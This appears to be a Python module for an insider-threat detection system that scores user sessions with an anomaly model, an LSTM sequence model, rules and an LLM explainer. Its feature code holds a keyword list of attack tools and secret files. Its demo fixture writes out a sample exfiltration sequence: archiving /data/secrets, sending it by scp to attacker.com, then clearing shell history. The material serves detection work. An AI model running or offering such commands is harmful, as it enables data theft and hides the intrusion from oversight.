"""
Inference pipeline — scores sessions through IF, LSTM, rules, fusion, and optional GenAI explanation.

Usage:
  result = score_session(session_data)
  df     = score_dataframe(df)
"""

import os
import sys
import json
import numpy as np
import pandas as pd
import joblib
import onnxruntime as ort
from pathlib import Path
from dataclasses import asdict
from typing import Dict, Optional
from dotenv import load_dotenv
load_dotenv()

SRC_DIR = Path(__file__).resolve().parent.parent
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from rule_engine import evaluate_session
from risk_fusion import fuse_scores, FusedRisk
from genai.explainer import explain_risk, build_risk_context, RiskExplanation
from genai.report import generate_report, ThreatReport
from genai.copilot import create_session, ask

PROJECT_ROOT    = SRC_DIR.parent
IF_MODEL_PATH   = PROJECT_ROOT / "models" / "isolation_forest.joblib"
IF_SCALER_PATH  = PROJECT_ROOT / "models" / "robust_scaler.joblib"
ONNX_MODEL_PATH = PROJECT_ROOT / "models" / "lstm_risk_model.onnx"
ONNX_META_PATH  = PROJECT_ROOT / "models" / "lstm_risk_model.meta.json"

_model_cache = {}


def load_models(force_reload: bool = False):
    """Load all models into cache once."""
    if force_reload or not _model_cache:
        # 1. Isolation Forest
        if IF_MODEL_PATH.exists():
            artifacts = joblib.load(IF_MODEL_PATH)
            _model_cache["if_model"]    = artifacts["model"]
            _model_cache["if_scaler"]   = artifacts["scaler"]
            _model_cache["if_features"] = artifacts["features"]
        else:
            print("[WARN] Isolation Forest model not found")

        # 2. ONNX LSTM Model
        if ONNX_MODEL_PATH.exists() and ONNX_META_PATH.exists():
            with open(ONNX_META_PATH, "r") as f:
                _model_cache["onnx_meta"] = json.load(f)
            
            # Initialize ONNX InferenceSession globally
            _model_cache["onnx_session"] = ort.InferenceSession(str(ONNX_MODEL_PATH))
        else:
            print("[WARN] ONNX LSTM model or metadata not found")
    return _model_cache


def score_anomaly(session: dict) -> float:
    """Isolation Forest anomaly score (0-1)."""
    load_models()
    if_model  = _model_cache.get("if_model")
    if_scaler = _model_cache.get("if_scaler")
    feature_cols = _model_cache.get("if_features", [])

    if if_model is None:
        return 0.0

    features = np.array([[float(session.get(c, 0)) for c in feature_cols]])
    features = if_scaler.transform(features)

    raw = if_model.decision_function(features)[0]
    return round(max(0.0, min(1.0, 0.5 - raw)), 4)


def _softmax(x):
    """Compute softmax values for each set of scores in x."""
    e_x = np.exp(x - np.max(x, axis=1, keepdims=True))
    return e_x / e_x.sum(axis=1, keepdims=True)


def score_sequence(session: dict) -> float:
    """ONNX sequence risk score (0-1)."""
    load_models()
    meta_info = _model_cache.get("onnx_meta")
    ort_sess  = _model_cache.get("onnx_session")
    
    if meta_info is None or ort_sess is None:
        return 0.0

    vocab   = meta_info["vocab"]
    max_len = meta_info["max_len"]
    
    # Process sequence
    cmd_seq = session.get("command_sequence", "")
    cmds    = cmd_seq.split(" -> ")[-max_len:]
    ids     = [vocab.get(c, 1) for c in cmds]
    ids     = [0] * (max_len - len(ids)) + ids
    x_seq   = np.array([ids], dtype=np.int64)

    # Process metadata
    raw_meta = _extract_meta(session, cmds, cmd_seq)
    scaler_mean = np.array(meta_info["scaler_mean"], dtype=np.float32)
    scaler_scale = np.array(meta_info["scaler_scale"], dtype=np.float32)
    
    x_meta = (raw_meta - scaler_mean) / (scaler_scale + 1e-8)
    x_meta = x_meta.astype(np.float32)

    # ONNX Inference
    ort_inputs = {
        "sequence": x_seq,
        "metadata": x_meta
    }
    logits = ort_sess.run(["logits"], ort_inputs)[0]
    probs = _softmax(logits)[0]

    return float(probs[2])


def _extract_meta(session, cmds, cmd_seq):
    return np.array([[
        float(session.get("after_hours", 0)),
        float(session.get("command_count", len(cmds))),
        len(set(cmds)) / max(len(cmds), 1),
        cmd_seq.lower().count("sudo"),
        sum(cmd_seq.lower().count(kw) for kw in
            ["base64","wget","curl","scp","nmap","sshpass",
             "chmod 777","crontab","/etc/shadow","attacker"]),
        float(session.get("session_duration_s", 0)),
    ]], dtype=np.float32)


def score_rules(session: dict) -> tuple:
    result = evaluate_session(session)
    return result.rule_score, result.rule_names


def score_session(session: dict, explain: bool = True) -> dict:
    """Full pipeline for a single session."""
    load_models()
    anomaly_score = score_anomaly(session)
    sequence_score = score_sequence(session)
    rule_score, triggered_rules = score_rules(session)

    fused = fuse_scores(anomaly_score, sequence_score, rule_score, triggered_rules)

    output = {
        "anomaly_score":   anomaly_score,
        "sequence_score":  sequence_score,
        "rule_score":      rule_score,
        "final_risk":      fused.final_risk,
        "risk_level":      fused.risk_level,
        "confidence":      fused.confidence,
        "triggered_rules": triggered_rules,
    }

    if explain:
        output["explanation"] = asdict(explain_risk(fused, session))

    return output


def score_dataframe(df: pd.DataFrame, top_n_explain: int = 5) -> pd.DataFrame:
    """Batch pipeline — vectorized IF + batched ONNX + optional Gemini for top-N."""
    load_models()
    df = df.copy()

    # Vectorized Isolation Forest
    if_model  = _model_cache.get("if_model")
    if_scaler = _model_cache.get("if_scaler")
    feat_cols = _model_cache.get("if_features", [])

    if if_model is not None:
        available = [c for c in feat_cols if c in df.columns]
        X = df[available].fillna(0).values.astype(float)
        if len(available) < len(feat_cols):
            pad = np.zeros((len(df), len(feat_cols) - len(available)))
            X = np.hstack([X, pad])
        X_scaled = if_scaler.transform(X)
        raw = if_model.decision_function(X_scaled)
        df["anomaly_score"] = np.clip(0.5 - raw, 0.0, 1.0).round(4)
    else:
        df["anomaly_score"] = 0.0

    # Batched ONNX Inference
    meta_info = _model_cache.get("onnx_meta")
    ort_sess  = _model_cache.get("onnx_session")

    if meta_info is not None and ort_sess is not None:
        vocab   = meta_info["vocab"]
        max_len = meta_info["max_len"]
        all_seq_ids = []
        all_meta    = []

        for _, row in df.iterrows():
            cmd_seq = str(row.get("command_sequence", ""))
            cmds = cmd_seq.split(" -> ")[-max_len:]
            ids  = [vocab.get(c, 1) for c in cmds]
            ids  = [0] * (max_len - len(ids)) + ids
            all_seq_ids.append(ids)
            all_meta.append(_extract_meta(row.to_dict(), cmds, cmd_seq)[0])

        x_seq  = np.array(all_seq_ids, dtype=np.int64)
        raw_meta = np.array(all_meta, dtype=np.float32)
        
        scaler_mean = np.array(meta_info["scaler_mean"], dtype=np.float32)
        scaler_scale = np.array(meta_info["scaler_scale"], dtype=np.float32)
        
        x_meta = (raw_meta - scaler_mean) / (scaler_scale + 1e-8)
        x_meta = x_meta.astype(np.float32)

        # Execute batched prediction natively via C++ ONNX
        ort_inputs = {
            "sequence": x_seq,
            "metadata": x_meta
        }
        logits = ort_sess.run(["logits"], ort_inputs)[0]
        probs  = _softmax(logits)

        df["sequence_score"] = probs[:, 2].round(4)
    else:
        df["sequence_score"] = 0.0

    # Rule engine
    rules_out = df.apply(lambda r: score_rules(r.to_dict()), axis=1)
    df["rule_score"]      = rules_out.apply(lambda x: x[0])
    df["triggered_rules"] = rules_out.apply(lambda x: x[1])

    # Fuse (preserve rule context and confidence in batch output)
    fused_out = df.apply(
        lambda r: fuse_scores(
            r["anomaly_score"],
            r["sequence_score"],
            r["rule_score"],
            r["triggered_rules"],
        ),
        axis=1,
    )
    df["final_risk"] = fused_out.apply(lambda x: x.final_risk).round(4)
    df["risk_level"] = fused_out.apply(lambda x: x.risk_level)
    df["confidence"] = fused_out.apply(lambda x: x.confidence).round(4)

    # Gemini explanations for top-N only
    df["explanation"] = ""
    if top_n_explain > 0:
        top_idx = df.nlargest(top_n_explain, "final_risk").index
        for idx in top_idx:
            row = df.loc[idx]
            fused = fuse_scores(
                row["anomaly_score"],
                row["sequence_score"],
                row["rule_score"],
                row["triggered_rules"],
            )
            df.at[idx, "explanation"] = str(asdict(explain_risk(fused, row.to_dict())))

    return df


if __name__ == "__main__":
    sample_session = {
        "session_id": "demo-001",
        "user_id": "AJF0370",
        "date": "2010-06-15",
        "after_hours": 1,
        "login_count": 12,
        "unique_devices_used": 4,
        "total_bytes_transferred": 2_500_000_000,
        "command_sequence": (
            "sudo su -> find / -name *.db -> "
            "tar czf /tmp/dump.tar.gz /data/secrets -> "
            "scp /tmp/dump.tar.gz attacker.com:/loot/ -> "
            "history -c"
        ),
        "command_count": 5,
        "session_duration_s": 3600,
    }

    print("=" * 60)
    print("  Inference Pipeline Demo")
    print("=" * 60)

    result = score_session(sample_session, explain=True)
    print(json.dumps(result, indent=2, default=str))
